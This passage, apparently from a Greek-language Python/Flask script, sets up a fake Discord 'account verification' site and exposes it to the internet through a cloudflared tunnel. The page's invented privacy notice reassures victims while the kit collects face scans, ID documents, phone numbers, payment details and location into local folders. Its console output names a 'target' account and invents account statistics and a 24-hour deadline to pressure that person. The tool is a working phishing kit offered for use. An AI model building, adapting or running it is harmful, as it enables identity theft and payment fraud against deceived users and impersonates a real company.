                    Αυτή η διαδικασία επαλήθευσης απαιτείται για να διασφαλιστεί η συμμόρφωση με τους Όρους Χρήσης του Discord, τους ηλικιακούς περιορισμούς και τα πρότυπα ασφάλειας της κοινότητας.
                </div>
            </div>
            
            <div class="section">
                <h2>Συλλογή Δεδομένων</h2>
                <p>Κατά τη διαδικασία επαλήθευσης του Discord, συλλέγουμε τις ακόλουθες πληροφορίες:</p>
                <ul>
                    <li><strong>Δεδομένα Αναγνώρισης Προσώπου</strong> - Προσωρινή σάρωση βίντεο για επαλήθευση ταυτότητας και ανίχνευση ζωντανότητας</li>
                    <li><strong>Πληροφορίες Εγγράφου Ταυτότητας</strong> - Διαβατήριο, άδεια οδήγησης ή άλλο επίσημο έγγραφο για επαλήθευση ηλικίας/ταυτότητας</li>
                    <li><strong>Αριθμός Τηλεφώνου</strong> - Για διπλή πιστοποίηση και σκοπούς ανάκτησης λογαριασμού</li>
                    <li><strong>Πληροφορίες Πληρωμής</strong> - Για επαλήθευση συνδρομής Discord Nitro (επεξεργάζονται με ασφάλεια)</li>
                    <li><strong>Δεδομένα Τοποθεσίας</strong> - Για περιφερειακή συμμόρφωση και επαλήθευση ασφαλείας</li>
                    <li><strong>Πληροφορίες Συσκευής</strong> - Για ανάλυση ασφαλείας και πρόληψη απάτης</li>
                    <li><strong>Πληροφορίες Λογαριασμού</strong> - Όνομα χρήστη, discriminator και βασικές λεπτομέρειες λογαριασμού</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Σκοπός Συλλογής Δεδομένων</h2>
                <p>Τα δεδομένα σας συλλέγονται αποκλειστικά για τους ακόλουθους σκοπούς:</p>
                <ul>
                    <li>Επαλήθευση ηλικίας και συμμόρφωση με τους κανονισμούς COPPA και άλλους περιφερειακούς κανονισμούς</li>
                    <li>Πιστοποίηση ταυτότητας και πρόληψη αποπλάνησης</li>
                    <li>Ενίσχυση ασφάλειας λογαριασμού και πρόληψη απάτης</li>
                    <li>Επαλήθευση συνδρομής Discord Nitro και επεξεργασία πληρωμής</li>
                    <li>Συμμόρφωση με περιφερειακό περιεχόμενο και επιβολή περιορισμών</li>
                    <li>Ασφάλεια κοινότητας και επιβολή Όρων Χρήσης</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Ασφάλεια Δεδομένων</h2>
                <p>Εφαρμόζουμε κορυφαία μέτρα ασφαλείας για την προστασία των δεδομένων σας:</p>
                <ul>
                    <li>Κρυπτογράφηση από άκρο σε άκρο για όλες τις μεταδόσεις δεδομένων</li>
                    <li>Ασφαλής αποθήκευση με κρυπτογράφηση AES-256</li>
                    <li>Τακτικοί έλεγχοι ασφαλείας και δοκιμές διείσδυσης</li>
                    <li>Αυστηροί έλεγχοι πρόσβασης και πρωτόκολλα πιστοποίησης</li>
                    <li>Συμμόρφωση με πρότυπα PCI DSS για δεδομένα πληρωμής</li>
                    <li>Πρακτικές διαχείρισης δεδομένων συμβατές με GDPR και CCPA</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Διατήρηση Δεδομένων</h2>
                <p>Όλα τα δεδομένα επαλήθευσης διαχειρίζονται σύμφωνα με αυστηρές πολιτικές διατήρησης:</p>
                <ul>
                    <li>Δεδομένα αναγνώρισης προσώπου: Διαγράφονται αυτόματα εντός 7 ημερών</li>
                    <li>Έγγραφα ταυτότητας: Κρυπτογραφούνται και διαγράφονται εντός 30 ημερών από την επιτυχή επαλήθευση</li>
                    <li>Αριθμοί τηλεφώνου: Διατηρούνται για σκοπούς ασφαλείας, μπορούν να διαγραφούν κατόπιν αιτήματος</li>
                    <li>Δεδομένα πληρωμής: Επεξεργάζονται με ασφάλεια, πλήρεις λεπτομέρειες κάρτας δεν αποθηκεύονται</li>
                    <li>Δεδομένα τοποθεσίας: Ανωνυμοποιούνται εντός 24 ωρών, διαγράφονται εντός 7 ημερών</li>
                    <li>Μεταδεδομένα: Διατηρούνται για ασφάλεια και συμμόρφωση έως και 90 ημέρες</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Δικαιώματά Σας</h2>
                <p>Έχετε τα ακόλουθα δικαιώματα σχετικά με τα δεδομένα σας:</p>
                <ul>
                    <li>Δικαίωμα πρόσβασης στα δεδομένα επαλήθευσής σας</li>
                    <li>Δικαίωμα αιτήματος διαγραφής των δεδομένων σας πριν από τις τυπικές περιόδους διατήρησης</li>
                    <li>Δικαίωμα εξαίρεσης από συγκεκριμένη συλλογή δεδομένων (μπορεί να περιορίσει τη λειτουργικότητα λογαριασμού)</li>
                    <li>Δικαίωμα φορητότητας δεδομένων</li>
                    <li>Δικαίωμα υποβολής παραπόνου σχετικά με τις πρακτικές διαχείρισης δεδομένων</li>
                    <li>Δικαίωμα ανάκλησης της συγκατάθεσης για επεξεργασία δεδομένων</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Κοινή χρήση με Τρίτους</h2>
                <p>Δεν πουλάμε ή μοιραζόμαστε τα δεδομένα επαλήθευσής σας με τρίτους για σκοπούς marketing. Τα δεδομένα μπορεί να κοινοποιηθούν με:</p>
                <ul>
                    <li>Ομάδα Εμπιστοσύνης & Ασφάλειας του Discord για έλεγχο επαλήθευσης</li>
                    <li>Νομικές αρχές όταν απαιτείται από το νόμο ή δικαστική απόφαση</li>
                    <li>Επεξεργαστές πληρωμών (μόνο για επαλήθευση πληρωμής, υπό αυστηρές συμβάσεις)</li>
                    <li>Παρόχους υπηρεσιών υπό συμφωνίες εμπιστευτικότητας</li>
                    <li>Γονέα/κηδεμόνα (για χρήστες κάτω των 13 ετών, όπως απαιτείται από το COPPA)</li>
                </ul>
            </div>
            
            <div class="section">
                <h2>Στοιχεία Επικοινωνίας</h2>
                <p>Για ερωτήσεις σχετικά με τις πρακτικές απορρήτου μας ή για να ασκήσετε τα δικαιώματά σας:</p>
                <ul>
                    <li>Ομάδα Απορρήτου: privacy@discord.com</li>
                    <li>Υπεύθυνος Προστασίας Δεδομένων: dpo@discord.com</li>
                    <li>Υποστήριξη: https://support.discord.com</li>
                </ul>
            </div>
            
            <div class="highlight">
                <strong>Σημείωση:</strong> Αυτή η διαδικασία επαλήθευσης έχει σχεδιαστεί για να διασφαλίζει την ασφάλεια της κοινότητας και τη συμμόρφωση με τους Όρους Χρήσης του Discord. 
                Όλα τα δεδομένα διαχειρίζονται σύμφωνα με την ολοκληρωμένη μας Πολιτική Απορρήτου και τους ισχύοντες νόμους.
            </div>
        </div>
    </body>
    </html>'''

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης από τον χρήστη
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4047
    script_name = "Επαλήθευση Λογαριασμού Discord"
    
    print("\n" + "="*60)
    print("ΣΕΛΙΔΑ ΕΠΑΛΗΘΕΥΣΗΣ ΛΟΓΑΡΙΑΣΜΟΥ DISCORD")
    print("="*60)
    print(f"[+] Όνομα Χρήστη Στόχου: {VERIFICATION_SETTINGS['target_username']}{VERIFICATION_SETTINGS['discriminator']}")
    print(f"[+] Τύπος Λογαριασμού: {VERIFICATION_SETTINGS['account_type'].upper()} ΕΠΑΛΗΘΕΥΣΗ")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Εικόνα Προφίλ: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    else:
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"[+] Τα δεδομένα θα αποθηκευτούν σε: {DOWNLOAD_FOLDER}")
    print(f"[+] Διάρκεια σάρωσης προσώπου: {VERIFICATION_SETTINGS['face_duration']} δευτερόλεπτα")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργοποιημένη ({VERIFICATION_SETTINGS.get('id_type', 'government')} ταυτότητα)")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"[+] Επαλήθευση τηλεφώνου: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Επαλήθευση πληρωμής: Ενεργοποιημένη")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργοποιημένη")
    print("\n[+] Φάκελοι που δημιουργήθηκαν:")
    print(f"    - face_scans/")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"    - id_documents/")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"    - phone_verification/")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"    - payment_proofs/")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"    - location_data/")
    print(f"    - user_data/")
    print("\n[+] Εκκίνηση διακομιστή...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    # Τερματικό prompt για χρήστη
    print("="*60)
    print("ΤΕΡΜΑΤΙΚΟ PROMPT ΓΙΑ ΧΡΗΣΤΗ")
    print("="*60)
    print(f"Το Discord ζητάει επαλήθευση λογαριασμού:")
    print(f"👤 Λογαριασμός: {VERIFICATION_SETTINGS['target_username']}{VERIFICATION_SETTINGS['discriminator']}")
    print(f"🎯 Λόγος: Απαιτείται {VERIFICATION_SETTINGS['account_type'].replace('_', ' ').title()} Επαλήθευση")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"🖼️  Προφίλ: Χρήση εικόνας προφίλ από λογαριασμό")
    else:
        print(f"👤 Προφίλ: Προεπιλεγμένο avatar Discord")
    
    # Δημιουργία κατάλληλων λεπτομερειών
    friends_count = random.randint(50, 500)
    servers_count = random.randint(5, 50)
    print(f"📊 Στατιστικά: {friends_count} φίλοι • {servers_count} διακομιστές • {random.randint(30, 365*3)} ημέρες παλαιότητας")
    
    print(f"🔒 Κατάσταση: Περιορισμένη πρόσβαση λογαριασμού")
    print(f"⏰ Χρονικό όριο: Ολοκληρώστε εντός 24 ωρών")
    print(f"📍 Απαιτείται: Σάρωση προσώπου, επαλήθευση ταυτότητας, επαλήθευση τηλεφώνου")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"💳 Επιπλέον: Επαλήθευση πληρωμής για Discord Nitro")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο σε πρόγραμμα περιήγησης για να ξεκινήσετε την επαλήθευση...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός διακομιστή επαλήθευσης Discord...")
        sys.exit(0)